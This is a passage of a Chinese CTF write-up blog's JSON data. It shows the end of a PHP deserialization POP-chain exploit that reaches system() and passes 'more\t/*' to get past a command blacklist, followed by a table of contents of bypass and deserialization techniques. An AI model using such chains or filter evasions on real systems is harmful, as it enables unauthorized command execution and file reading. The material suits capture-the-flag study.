class=\"variable\">$kkk</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;look!you are hero&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;kkk;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">four</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eval</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$pattern</span> = <span class=\"string\">&quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$this</span>-&gt;s)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(<span class=\"string\">&quot;oh nonono hacker!&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$this</span>-&gt;s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">eval</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;aaaa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$obj_one</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">one</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj_two</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">two</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj_three</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">three</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj_four</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">four</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Set up the chain</span></span><br><span class=\"line\"><span class=\"variable\">$obj_four</span>-&gt;s = <span class=\"string\">&quot;more\t/*&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$obj_three</span>-&gt;kkk = <span class=\"variable\">$obj_four</span>;</span><br><span class=\"line\"><span class=\"variable\">$obj_two</span>-&gt;func = <span class=\"variable\">$obj_three</span>;</span><br><span class=\"line\"><span class=\"variable\">$obj_one</span>-&gt;a = <span class=\"variable\">$obj_two</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$pop</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$obj_one</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$pop</span>));</span><br><span class=\"line\"><span class=\"comment\">//unserialize($pop);</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","text":"https://gz.imxbt.cn/games Ctf经验及其题目总结l 做题经验：不要忽略index.php** 和查看源代码 l robots.txt ...","permalink":"/post/赛题总结1","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Ctf%E7%BB%8F%E9%AA%8C%E5%8F%8A%E5%85%B6%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">Ctf经验及其题目总结</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MD5%E5%90%84%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">MD5各姿势绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BAMD5%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97\"><span class=\"toc-text\">1.判断是否为MD5的关键字</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-MD5%E6%AF%94%E8%BE%83-%EF%BC%88%E5%8F%8C-%EF%BC%89\"><span class=\"toc-text\">2.MD5比较 （双&#x3D;&#x3D;）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%EF%BC%9A-a-b-md5-a-md5-b\"><span class=\"toc-text\">3：$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%EF%BC%9A-%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">4：&#x3D;&#x3D;&#x3D;强类型比较</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-md5-a-md5-md5-b\"><span class=\"toc-text\">5.md5($a) &#x3D;&#x3D; md5(md5($b)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-a-md5-a\"><span class=\"toc-text\">4.$a&#x3D;&#x3D;md5($a)</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">php 弱类型总结</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#md5\"><span class=\"toc-text\">md5</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#json-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">json 绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#array-search%EF%BC%88%EF%BC%89-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">array_search（） 绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#strcmp%EF%BC%88%EF%BC%89%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">strcmp（）绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#switch%EF%BC%88%EF%BC%89%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">switch（）绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%90%E4%B9%9F%E5%B8%83%E5%B0%94%EF%BC%8C%E8%B4%A5%E4%B9%9F%E5%B8%83%E5%B0%94\"><span class=\"toc-text\">成也布尔，败也布尔</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#intval%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">intval绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#linux-rce%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">linux rce空格绕过</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#MISC\"><span class=\"toc-text\">MISC</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%89%B9%E5%BE%81\"><span class=\"toc-text\">蚁剑流量分析特征</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#LitCTF2024\"><span class=\"toc-text\">LitCTF2024</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#zip%E4%BC%AA%E5%8A%A0%E5%AF%86-%E7%89%B9%E5%BE%81\"><span class=\"toc-text\">zip伪加密 特征</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">git文件泄露</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Back-to-the-future\"><span class=\"toc-text\">Back to the future</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%98%E9%87%8F%E6%8E%A7%E5%88%B6%E5%92%8Cphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">变量控制和phar反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%81%94%E7%B3%BBxx%E5%92%8Cff\"><span class=\"toc-text\">联系xx和ff</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%8E%A7%E5%88%B6xx%E7%B1%BB%E4%B8%AD-key\"><span class=\"toc-text\">控制xx类中$key</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#write-var\"><span class=\"toc-text\">write($var)</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%8D%E6%AC%A1%E8%81%94%E7%B3%BBxx%E5%92%8Cff\"><span class=\"toc-text\">再次联系xx和ff</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#exp\"><span class=\"toc-text\">exp</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%BC%E5%90%88\"><span class=\"toc-text\">文件包含和序列化综合</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ZJCTF-2019-NiZhuanSiWei\"><span class=\"toc-text\">[ZJCTF 2019]NiZhuanSiWei</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%BC%82%E5%B8%B8%E6%8A%9B%E5%87%BA%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">phar反序列化和异常抛出绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#prize-p1\"><span class=\"toc-text\">prize_p1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E4%BB%BD\"><span class=\"toc-text\">第一部份</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第二部分</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第三部分</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%94%9F%E4%BA%A7phar%E6%96%87%E4%BB%B6-ph1-phar\"><span class=\"toc-text\">生产phar文件 ph1.phar</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9ph1-phar%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87%E5%BC%82%E5%B8%B8%E6%8A%9B%E5%87%BA\"><span class=\"toc-text\">修改ph1.phar文件中的序列化字符串绕过异常抛出</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E7%AD%BE%E5%90%8D\"><span class=\"toc-text\">修复签名</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%8B%E7%BC%A9%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">压缩绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">数组绕过</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8\"><span class=\"toc-text\">字符串逃逸</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#prize-p5\"><span class=\"toc-text\">prize_p5</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">解法一</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8\"><span class=\"toc-text\">序列化字符串逃逸</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">解法二</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%80%9A%E8%BF%87php%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">通过php原生类来读取文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9C%A8%E9%80%9A%E8%BF%87SplFileObject%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">在通过SplFileObject读取文件内容</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%89%8B%E5%8A%A8%E6%94%B9%E9%93%BE%E5%AD%90\"><span class=\"toc-text\">手动改链子</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BC%82%E5%B8%B8%E6%8A%9B%E5%87%BA%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">异常抛出绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ezpop\"><span class=\"toc-text\">ezpop</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GC%EF%BC%88%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%EF%BC%89\"><span class=\"toc-text\">GC（垃圾回收）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#CG%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">CG与反序列化的利用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E6%9E%84%E9%80%A0pop\"><span class=\"toc-text\">利用PHP垃圾回收机制构造pop</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">动态函数执行语句</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">私有属性进行序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Really-EZ-POP\"><span class=\"toc-text\">Really EZ POP</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#php%E7%B1%BB%E4%B8%AD%E7%9A%84%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7\"><span class=\"toc-text\">php类中的私有属性</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Crce\"><span class=\"toc-text\">序列化和rce</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-ezunserilize\"><span class=\"toc-text\">第四届极客少年挑战赛初赛 ezunserilize</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E6%9E%84%E9%80%A0%E5%85%AB%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">解法一：构造八进制命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%A9%BA%E6%A0%BC%E6%9B%BF%E6%8D%A2-t\"><span class=\"toc-text\">空格替换\\t</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#ls\"><span class=\"toc-text\">ls\t&#x2F;</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#cat-4l2g\"><span class=\"toc-text\">cat\t&#x2F;4l2g</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Amore%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">解法二：more绕过</span></a></li></ol></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"赛题总结3","uid":"a31a5557cbeb213ac7cdc723f501dbeb","slug":"赛题总结3","date":"2024-10-31T12:43:45.000Z","updated":"2024-10-31T12:44:43.827Z","comments":true,"path":"api/articles/赛题总结3.json","keywords":null,"cover":"/image/11.png","text":"JWT令牌伪造JSON Web Token HFCTF2020 EasyLoginhttps://buuoj.cn/challenges#[HFCTF2020]...","permalink":"/post/赛题总结3","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"赛题总结2","uid":"442c6fcbd30c196cf34836f1e603185c","slug":"赛题总结2","date":"2024-10-31T08:30:56.000Z","updated":"2024-10-31T08:43:54.049Z","comments":true,"path":"api/articles/赛题总结2.json","keywords":null,"cover":"/image/12.png","text":"原型链污染python原型链污染Jinja Mark python原型链污染例子 123456789101112131415161718192021222324...","permalink":"/post/赛题总结2","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}